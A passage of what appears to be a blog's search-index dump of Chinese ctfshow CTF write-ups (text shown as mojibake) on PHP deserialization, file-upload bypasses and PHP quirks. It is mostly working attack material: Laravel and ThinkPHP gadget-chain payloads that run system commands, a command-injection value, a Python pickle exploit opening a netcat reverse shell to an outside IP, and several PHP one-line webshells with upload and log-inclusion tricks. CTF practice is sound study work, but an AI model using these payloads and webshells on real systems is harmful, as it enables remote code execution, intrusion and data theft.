use Mockery\\Loader\\EvalLoader;\n    class Dispatcher\n    {\n        protected $queueResolver;\n        public function __construct()\n        {\n            $this->queueResolver=[new EvalLoader(),'load'];\n            //$this->queueResolver=array(new EvalLoader(),'load'); \n            //æ•°ç»„\n        }\n\n    }\n}\n\nnamespace Mockery\\Loader{\n    class EvalLoader{\n\n    }\n}\n\nnamespace{\n\n    use Illuminate\\Broadcasting\\PendingBroadcast;\n\n    echo urlencode(serialize(new PendingBroadcast()));\n}\n?>\n```\n\npost:`data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A42%3A%22%3C%3Fphp+echo+system%28%27cat+%2Fflag%27%29%3B+exit%28%29%3B+%3F%3E%22%3B%7D%7D%7D`\n\n# WEB-274(thinkPHP5.1ååºåˆ—åŒ–)\n\nçœ‹åˆ°ç•Œé¢å°±å¾ˆç†Ÿæ‚‰ä¸€çœ¼ä¸çœŸæ˜¯thinkphp\n\n```php\n<?php\nnamespace think;\nabstract class Model{\n    protected $append = [];\n    private $data = [];\n    function __construct(){\n        $this->append = [\"ethan\"=>[\"dir\",\"calc\"]];\n        $this->data = [\"ethan\"=>new Request()];\n\t}\n}\nclass Request\n{\n    protected $hook = [];\n    protected $filter = \"system\";\n    protected $config = [\n    'var_method'       => '_method',// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡\n    'var_ajax'         => '_ajax',// è¡¨å•ajaxä¼ªè£…å˜é‡\n    'var_pjax'         => '_pjax',// è¡¨å•pjaxä¼ªè£…å˜é‡\n    'var_pathinfo'     => 's',// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼\n    'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],// å…¼å®¹PATH_INFOè·å–\n    'default_filter'   => '',// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª\n    'url_domain_root'  => '',// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn\n    'https_agent_name' => '',// HTTPSä»£ç†æ ‡è¯†\n    'http_agent_ip'    => 'HTTP_X_REAL_IP',// IPä»£ç†è·å–æ ‡è¯†\n    'url_html_suffix'  => 'html',// URLä¼ªé™æ€åç¼€\n    ];\n    function __construct(){\n        $this->filter = \"system\";\n        $this->config = [\"var_ajax\"=>''];\n        $this->hook = [\"visible\"=>[$this,\"isAjax\"]];\n    }\n}\nnamespace think\\process\\pipes;\nuse think\\model\\concern\\Conversion;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files = [];\n    public function __construct()\n    {\n    \t$this->files=[new Pivot()];\n    }\n}\nnamespace think\\model;\nuse think\\Model;\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho base64_encode(serialize(new Windows()));\n?>\n```\n\npayload:\n\n```\n?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&shell=cat /flag\n```\n\n# WEB-275\n\nè¿™é“é¢˜æœ‰ä¸ªé€»è¾‘é”™è¯¯ ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºå…³é”®åœ¨äº`copy($_GET['fn'],md5(mt_rand()).'.txt');`\n\nè¿™é“é¢˜ç›®é—®é¢˜æ˜¯å°†æˆ‘ä»¬æœ¨é©¬æ–‡ä»¶èµ‹å€¼åˆ°ä¸€ä¸ªéšæœºæ–‡ä»¶ä¸­ ç„¶åæŠŠæˆ‘ä»¬çš„æ–‡ä»¶åˆ äº† \n\næœ¬æ¥æƒ³æ˜¯åœ¨ä»–åˆ é™¤æˆ‘ä»¬æ–‡ä»¶ä¹‹å‰åˆ©ç”¨é‡å®šå‘ å°†flagè¯»åˆ°åˆ«çš„æ–‡ä»¶ä¸­ ä¹‹åå‘ç°ä¸è¡Œ æ²¡æœ‰æƒé™å¥½åƒ\n\nçœ‹äº†çœ¼wp è¿”ç°çº¯çº¯çš„é€»è¾‘é—®é¢˜ ç›´æ¥åˆ©ç”¨ææ„å‡½æ•°é‡Œçš„system æ‹¼æ¥å‘½ä»¤å³å¯\n\npayload:\n\n```php\n?fn=;cat f*\npost:flag=1\n```\n\n# WEB-276(pharååºåˆ—åŒ–)\n\né¦–å…ˆè¿™é“é¢˜ç›®å¢åŠ äº†ä¸€ä¸ªadmin æƒ³è¿›å…¥ææ„å‡½æ•°æ‰§è¡Œsystemåˆ™å¿…é¡»ä¿®æ”¹è¿™ä¸ªadmin\n\né‚£ä¹ˆå°±éœ€è¦è¿›è¡Œååºåˆ—åŒ– ä½†æ˜¯é¢˜ç›®å¹¶æ²¡æœ‰ç»™æˆ‘ä»¬ååºåˆ—åŒ–çš„å‡½æ•°\n\nç„¶åçœ‹äº†wpå°±æ˜¯é€šè¿‡pharæ¥è¿›è¡Œçš„ \n\né¦–å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ç„¶åå†…å®¹æ˜¯pharç”Ÿæˆçš„å†…å®¹(åŒ…å«æˆ‘ä»¬çš„æ¶æ„åºåˆ—åŒ–å†…å®¹) è¿™æ˜¯ä¸€ä¸ªå›ºå®šæ ¼å¼ æˆ‘ä¹‹å‰æ€»ç»“è¿‡è¿™é‡Œå°±ä¸èµ˜è¿°äº†\n\nä½†æ˜¯ä¸€å¼€å§‹æˆ‘æœ€å¤§çš„é—®é¢˜ æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶éœ€è¦é…åˆphar://åè®® ç„¶åæˆ‘ä»¬çš„æ¶æ„å†…å®¹æ‰ä¼šè¿›è¡Œååºåˆ—åŒ–\n\nåœ¨å“ªé‡Œåˆ©ç”¨phar://å‘¢ ç„¶ååˆæ£€ç´¢äº†ä¸€ç•ª åŸæ¥æ˜¯æˆ‘ä»¬ä¸Šä¼ ä¸Šå»ä¹‹å è„šæœ¬æºç æ˜¯é€šè¿‡unlinkå‡½æ•°è¿›è¡Œåˆ é™¤æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶çš„ åˆšå¥½è¿™ä¸ªunlinkå‡½æ•°å°±å¯ä»¥é…åˆphar://åè®®å°†æˆ‘ä»¬çš„æ¶æ„å†…å®¹ååºåˆ—åŒ– \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626698460-3d19f897-bf37-42d3-9f43-4837397627db.png)\n\nå› æ­¤è¿™é‡Œéœ€è¦æ¡ä»¶ç«äº‰ ä¸€ä¸ªåŒ…ä¸€ç›´å‘ä¸Šä¼ pharåºåˆ—åŒ–å†…å®¹çš„åŒ… å¦ä¸€ä¸ªåŒ…ä¸€ç›´å‘phar://åè®®è®¿é—®æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„åŒ…\n\nä½†æ˜¯ä¸çŸ¥é“æ˜¯æˆ‘å“ªé‡Œä¸å¯¹ï¼Œè¿˜æ˜¯é¢˜ç›®ç¯å¢ƒé—®é¢˜ï¼Œä¸ç®¡æ˜¯è‡ªå·±å‘åŒ…è¿˜æ˜¯åˆ«äººçš„pocï¼Œæˆ‘ä¸€ç›´æ²¡æˆåŠŸï¼Œä¸è¿‡æ˜ç™½æ€ä¹ˆåšå°±okäº†ï¼Œæ€è·¯æœ€é‡è¦ã€‚\n\nç„¶åå—å½±å“çš„å‡½æ•°æœ‰è¿™äº›\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626857137-67729b1e-5c69-4be4-bad3-918e41ebd0d4.png)\n\nå·çš„ï¼šhttps://paper.seebug.org/680/\n\n\n\n# WEB-277 288ï¼ˆpythonï¼‰\n\nå¸¸è§„ååºåˆ—åŒ– \n\næŸ¥çœ‹æºç `#--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)`\n\nEXPå¦‚ä¸‹ï¼š\n\n```python\nimport base64\nimport pickle\n#--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)\nclass EXP():\n    def __reduce__(self):\n        return(eval, (\"__import__('os').popen('nc ip 7777 -e /bin/sh')\",))\nexp = EXP()\na = pickle.dumps(exp)\nprint(base64.b64encode(a))\n```\n\n\n\n# å°¾å·´ï¼š\n\nè‡³æ­¤ å³å°†è¿›å†›javaæ¨¡å— å½“ç„¶å‡†å¤‡å¼€å§‹å­¦ä¹ javaï¼å†²å°±å®Œäº†\n","tags":["ååºåˆ—åŒ–"],"categories":["ctfshow"]},{"title":"ctfshow-æ–‡ä»¶ä¸Šä¼ ","url":"/post/c5a854c1.html","content":"\nctfshow-æ–‡ä»¶ä¸Šä¼ \n\n<!--more-->\n\n# WEB-151(å‰ç«¯éªŒè¯)\n\nä¸Šä¼ pngåç¼€çš„ ç„¶åæŠ“åŒ…æ”¹å›phpå³å¯\n\n# WEB-152(åç«¯Content-Typeæ ¡éªŒ)\n\n Content-Typeæ˜¯è¿”å›æ¶ˆæ¯ä¸­éå¸¸é‡è¦çš„å†…å®¹ï¼Œè¡¨ç¤ºåé¢çš„æ–‡æ¡£å±äºä»€ä¹ˆMIMEç±»å‹ã€‚  \n\næ‰€ä»¥è·Ÿ151åšæ³•ä¸€æ · å…ˆä¸Šä¼ pngç„¶åbpæ”¹åç¼€å³å¯\n\nå‚è€ƒï¼š\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types\n\nhttps://segmentfault.com/a/1190000013056786\n\n# WEB-153ï¼ˆ.user.iniï¼‰\n\nå‰ä¸¤ç§é€šè¿‡ä¿®æ”¹åç¼€è¿™é‡Œä¸èƒ½ç”¨äº†\n\nè®¿é—®/upload å‘ç°æœ‰å†…å®¹nothing here ç„¶åå¯ä»¥çŒœåˆ°è¿™é‡Œæœ‰/uplaod/index.php \n\né‚£ä¹ˆç›®æ ‡å°±å¾ˆæ˜ç¡®äº† æˆ‘ä»¬ä¸Šä¼ çš„è·¯å¾„ä¸‹æœ‰ä¸€ä¸ªç°æˆçš„phpæ–‡ä»¶ ç†æ‰€å½“ç„¶æƒ³åˆ°é€šè¿‡ä¸Šä¼ .user.iniæ¥åšè¿™é“é¢˜\n\nä½†æ˜¯.htaccessåªæ˜¯é€‚ç”¨äºapacheï¼Œå¦‚æœå˜æˆniginxæˆ–è€…iisåˆ™ä¸ä¼šè¢«è§£æ  \t\n\né€šè¿‡æŠ¥é”™æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¢˜ç›®ç¯å¢ƒä¸­é—´ä»¶æ˜¯nginx ä½†æ˜¯è¿™ä¹Ÿä¸å½±å“æˆ‘ä»¬ç”¨.user.ini\n\nå› ä¸ºåªè¦ç”¨äº†fastcgiæˆ‘ä»¬å°±å¯ä»¥ç”¨.user.ini\n\nFastCGIå¸¸ç”¨äºå°†WebæœåŠ¡å™¨ï¼ˆå¦‚Nginxã€Apacheï¼‰ä¸åº”ç”¨ç¨‹åºï¼ˆå¦‚PHPã€Pythonã€Rubyï¼‰è¿›è¡Œé›†æˆï¼Œä»¥æä¾›åŠ¨æ€å†…å®¹çš„ç”Ÿæˆå’Œå¤„ç†èƒ½åŠ›ã€‚å®ƒæ˜¯ä¸€ç§é«˜æ€§èƒ½ã€çµæ´»å’Œå¯æ‰©å±•çš„Webåº”ç”¨ç¨‹åºäº¤äº’åè®®ã€‚  \n\n.user.ini:\n\n.user.iniä¹Ÿæ˜¯phpçš„ä¸€ç§é…ç½®æ–‡ä»¶ï¼Œä¼—æ‰€å‘¨çŸ¥php.iniæ˜¯phpçš„é…ç½®æ–‡ä»¶ï¼Œå®ƒå¯ä»¥åšåˆ°æ˜¾ç¤ºæŠ¥é”™ï¼Œå¯¼å…¥æ‰©å±•ï¼Œæ–‡ä»¶è§£æï¼Œwebç«™ç‚¹è·¯å¾„ç­‰ç­‰è®¾ç½®ã€‚ä½†æ˜¯å¦‚æœæƒ³è¦æŠŠæŸä¸ªæ–‡ä»¶é‡Œé¢çš„é…ç½®ä¸å…¨å±€çš„php.iniä¸åŒï¼Œåˆ™å¯ä»¥åœ¨phpæ–‡ä»¶ä¸­åŠ ä¸Šini_set()æ¥é…ç½®ç‰¹å®šçš„é…ç½®å˜é‡ã€‚\n\nè€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯å¯¹å½“å‰ç›®å½•çš„æ‰€ä»¥phpæ–‡ä»¶çš„é…ç½®è®¾ç½®ï¼Œå³å†™äº†.user.iniå’Œå®ƒåŒç›®å½•çš„æ–‡ä»¶ä¼šä¼˜å…ˆä½¿ç”¨.user.iniä¸­è®¾ç½®çš„é…ç½®å±æ€§ã€‚\n\nå·çš„https://www.cnblogs.com/sijidou/p/13121301.html\n\nç®€å•ç†è§£å°±æ˜¯phpçš„é…ç½®æ–‡ä»¶å®ƒå¯ä»¥è®¾ç½®ä¸€äº›é…ç½® æ¯”å¦‚æ€ä¹ˆå»è§£ææˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¸€ç±»çš„\n\nå†…å®¹:\n\n```php\n//.user.ini\n\nauto_prepend_file=top.html\nauto_append_file=down.html\n```\n\næ€ä¹ˆç†è§£ï¼Ÿ\n\nå°±æ˜¯æŠŠæˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶åŒ…å«è¿›å®¿ä¸»phpæ–‡ä»¶ä¸­ åˆ©ç”¨å…¶å®æœ¬è´¨å°±æ˜¯ç”¨require()å»åŒ…å«æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶å¹¶ä¸”å³ä½¿åç¼€ä¸æ˜¯phpæ–‡ä»¶ä¹Ÿå¯è¢«å½“ä½œphpæ–‡ä»¶æ¥è§£æ\n\nè¿™é‡Œrequire()å®Œå…¨å°±æ˜¯include()å‡½æ•°ä¸€æ ·\n\nä¸€ä¸ªæ˜¯å®¿ä¸»phpæ–‡ä»¶å¤´éƒ¨å»åŒ…å« ä¸€ä¸ªæ˜¯å°¾éƒ¨ä¸¤è€…çš†å¯\n\nå…ˆå°†.user.iniå¢åŠ åç¼€pngç„¶åæŠ“åŒ…å»é™¤ åœ¨ä¸Šä¼ æˆ‘ä»¬æŒ‡å®šçš„æ¶æ„æ–‡ä»¶\n\nè¿™æ—¶æˆ‘ä»¬å‰é¢å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº† ç›´æ¥è®¿é—®/upload/index.php è¿™æ ·æˆ‘ä»¬çš„æœ¨é©¬å°±è¢«åŒ…å«åœ¨è¿™ä¸ªindex.phpæ–‡ä»¶ä¸­äº†è€Œä¸æ˜¯ç›´æ¥å»è®¿é—®æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶\n\nå¯ä»¥çœ‹åˆ° å·²ç»åŒ…å«åœ¨å¤´éƒ¨äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png)\n\n# WEB-154~155ï¼ˆ.user.ini+çŸ­æ ‡ç­¾ï¼‰\n\nwafäº†æ–‡ä»¶å†…å®¹phpå­—æ ·\n\nç”¨çŸ­æ ‡ç­¾bypasså³å¯ \n\n```php\n<?=@eval($_POST[x]);?>\n```\n\n# WEB-156([]ç»•è¿‡)\n\nåœ¨154~155åŸºç¡€ä¸Šè¿‡æ»¤äº†`[]`ç”¨`{}`bypass\n\n```\n<?=@eval($_POST{x});?>\n```\n\n# WEB-157~159({} ; ()ç»•è¿‡)\n\nåœ¨å‰é¢åŸºç¡€ä¸Šè¿‡æ»¤äº†{}å’Œåˆ†å· é‚£æˆ‘ä»¬ä¸å†™ä¸€å¥è¯äº† ç›´æ¥å‘½ä»¤æ‰§è¡Œè¯»flag\n\n```\n<?=`tac ./../f*`;?>` æˆ–è€…`<?=system('tac ../f*')?>\n```\n\n159ä¸è¡Œ è¿‡æ»¤äº†æ‹¬å·åªèƒ½ç”¨ç¬¬ä¸€ç§ \n\n# WEB-160(æ—¥å¿—åŒ…å« ç»•log)\n\n`<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>`logç”¨æ‹¼æ¥ç»•è¿‡\n\nç„¶åæ–‡ä»¶å¤´User-AgentåŒ…å«ä¸€å¥è¯æœ¨é©¬å³å¯\n\n# WEB-161(æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡)\n\nåœ¨160åŸºç¡€ä¸Šå¢åŠ äº†æ£€æµ‹æ–‡ä»¶å¤´çš„å‡½æ•° å¢åŠ å›¾ç‰‡å¤´GIF89aç»•è¿‡å³å¯\n\ngetimagesize(): ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688365737442-53a194dd-aeea-4986-ba00-86ec08a101d4.png)\n\nå…¶å®GIF89aå°±æ˜¯æˆ‘ä»¬ä¸€èˆ¬è§åˆ°çš„gifåŠ¨å›¾çš„æ–‡ä»¶å¤´\n\né€šè¿‡010å¯¹ä¸€ä¸ªgifå›¾åˆ†æå°±èƒ½çœ‹åˆ°æ–‡ä»¶å¤´\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688444635540-b95e7f67-b6d6-4d61-9ecd-040a9d0124a4.png)\n\n# WEB-162~163(session æ¡ä»¶ç«äº‰)\n\nä¹‹å‰åˆ«çš„æ¨¡å—åšè¿‡ç±»ä¼¼çš„\n\n```php\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"http://953ea87b-dff4-45be-adac-15a38b1fd7e3.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n```\n\nä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ”¹æ•°æ®åŒ…ï¼š\n\nåŠ ä¸Šæœ¨é©¬å’Œ`Cookie:PHPSESSID=ban`\n\n```php\nPOST / HTTP/1.1\nHost: 953ea87b-dff4-45be-adac-15a38b1fd7e3.challenge.ctf.show\nContent-Length: 352\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarybDQ9C8w3UWP0rUGY\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nCookie:PHPSESSID=ban\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundarybDQ9C8w3UWP0rUGY\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n<?php system('cat ../f*');?>\n------WebKitFormBoundarybDQ9C8w3UWP0rUGY\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\nGIF89a\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n\n\n------WebKitFormBoundarybDQ9C8w3UWP0rUGY--\n```\n\nç„¶åå†å°†.user.iniæ”¹ä¸º\n\n```php\nGIF89a\nauto_prepend_file=/tmp/sess_ban\n```\n\nç„¶åä¸¤ä¸ªæ¡ä»¶ç«äº‰ä¸€ç›´å‘åŒ…å³å¯\n\n# WEB-164ï¼ˆPNG äºŒæ¬¡æ¸²æŸ“ï¼‰\n\néšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ ç„¶åæˆ‘ä»¬å¯ä»¥è®¿é—®`http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png` å¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡æ–‡ä»¶åŒ…å«å½¢å¼\n\näºŒæ¬¡æ¸²æŸ“å°±æ˜¯æˆ‘ä»¬å¤¹æ‚åœ¨å›¾åƒé‡Œçš„æœ¨é©¬ä¸Šä¼ åä¼šè¢«åˆ æ‰ æˆ‘ä»¬éœ€è¦ä¸‹è½½ä¸‹æ¥æ‰¾åˆ°å®ƒä¸åˆ é™¤çš„åœ°æ–¹æŠŠæˆ‘ä»¬çš„æœ¨é©¬åŠ è¿›å»ç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ‰§è¡Œæˆ‘ä»¬çš„æœ¨é©¬\n\nå› ä¸ºæˆ‘çš„phpæ˜¯8.2.0çš„ç‰ˆæœ¬ ä¿®æ”¹iniæ–‡ä»¶ `extension=gd`æŠŠå‰é¢çš„`;`å»æ‰\n\nç„¶åæ‰èƒ½ç”¨è¿™ä¸ªè„šæœ¬\n\n```php\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n            0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n            0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n            0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n            0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n            0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n            0x66, 0x44, 0x50, 0x33);\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n    $r = $p[$y];\n    $g = $p[$y+1];\n    $b = $p[$y+2];\n    $color = imagecolorallocate($img, $r, $g, $b);\n    imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'1.png');  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„ \n\n/* æœ¨é©¬å†…å®¹\n<?$_GET[0]($_POST[1]);?>\n */\n//imagepng($img,'1.png');  è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨\n//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡\n//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);\n//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688451112419-1980ecb8-25aa-44d8-b6fe-14b539de29fc.png)\n\nå¯ä»¥çœ‹åˆ°æœ¨é©¬æ˜¯ä»¥çŸ­æ ‡ç­¾å†™è¿›å»çš„\n\næŠ“åŒ…æ‰§è¡Œå³å¯\n\n\n\n```php\nPOST /download.php?image=4a47a0db6e60853dedfcfdf08a5ca249.png&0=system HTTP/1.1\nHost: 6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show\nContent-Length: 14\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n\n1=cat+flag.php\n```\n\n# WEB-165(jpgäºŒæ¬¡æ¸²æŸ“)\n\nå‚»é€¼é¢˜ æ²¡å•¥å¥½è¯´çš„\n\n# WEB-166(zip)\n\nç»™zipåé¢æ·»åŠ ä¸€å¥è¯ä¸Šä¼  ç„¶ååŒ…å«æ‰§è¡Œ é¢˜ç›®ç¯å¢ƒæœ‰é—®é¢˜ è¿”å›åŒ…æ˜¯ç©ºçš„\n\n# WEB-167(.htaccess)\n\næŠ¥500é”™è¯¯ ç¯å¢ƒæœ‰é—®é¢˜ æ— è¯­äº†\n\n.htaccessä¹Ÿæ˜¯phpçš„é…ç½®æ–‡ä»¶ æ˜¯ä¸€ä¸ªå±€éƒ¨é…ç½®æ–‡ä»¶ åªå¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨\n\næˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸Šå»jpgæ–‡ä»¶ ä½†æ˜¯ä¸æ˜¯phpæ–‡ä»¶ æ— æ³•è§£æ\n\næ‰€ä»¥æˆ‘ä»¬éœ€è¦.htaccessè¿™ä¸ªæ–‡ä»¶å»å°†æˆ‘ä»¬çš„jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ \n\nå†…å®¹ï¼š\n\n```php\n<FilesMatch \"1.jpg\"> //éœ€è¦è§£æçš„æ–‡ä»¶å\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n# WEB-168(å…æ€)\n\nè¿‡æ»¤äº†eval get post system\n\npaylaod:\n\n```php\n<?=`$_REQUEST[1]`;?>\n<?php echo `$_REQUEST[x]`;?>\n<?php $_REQUEST[1]($_REQUEST[2]);?>\n<?php $a='syste'.'m';($a)('ls ../');    //æ‹¼æ¥\n```\n\nå½“æ—¶ç”¨åå¼•å·åšçš„æ—¶å€™ä¸€ç›´åœ¨æƒ³ä¸ºä»€ä¹ˆè¿”å›åŒ…æ˜¯ç©ºç™½ åæ¥æ‰æƒ³åˆ°è¿™ä¸ªåå¼•å·æ²¡æœ‰å›æ˜¾ è¦ç”¨echoä¸€ä¸‹ æˆ–è€…æ­é…çŸ­æ ‡ç­¾\n\n# WEB-169~WEB-170(æ—¥å¿—åŒ…å«)\n\nå¯ä»¥ä¸Šä¼ phpæ–‡ä»¶åˆ°uploadä¸‹ç„¶åä¸Šä¼ user.ini é‡Œé¢çš„å†…å®¹æŒ‡å‘nginxçš„æ—¥å¿—æ–‡ä»¶ ç„¶åè¯·æ±‚å¤´å†™å…¥ä¸€å¥è¯æœ¨é©¬ å»åŒ…å«è®¿é—®å³å¯\n\n# ç»“å°¾ï¼š\n\nçœŸè¢«æŸäº›é¢˜ç¯å¢ƒæå¿ƒæ€äº† \n\nç»§ç»­ä¸‹ä¸€å¤§é™† sqlæ³¨å…¥ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼\n\n# \n","tags":["æ–‡ä»¶ä¸Šä¼ "],"categories":["ctfshow"]},{"title":"ctfshow-phpç‰¹æ€§","url":"/post/61d76257.html","content":"\nctfshow-phpç‰¹æ€§\n\n<!--more-->\n\n# WEB-89(æ•°ç»„ç»•æ­£åˆ™)\n\néœ€è¦æˆ‘ä»¬è¾“å…¥æ•°å­—ä½†æ˜¯æ­£åˆ™åŒ¹é…ä¸èƒ½è¾“å…¥æ•°å­— é€šè¿‡æ•°å­—bypass preg_match()å³å¯\n\n```\n?num[]=1\n```\n\n# 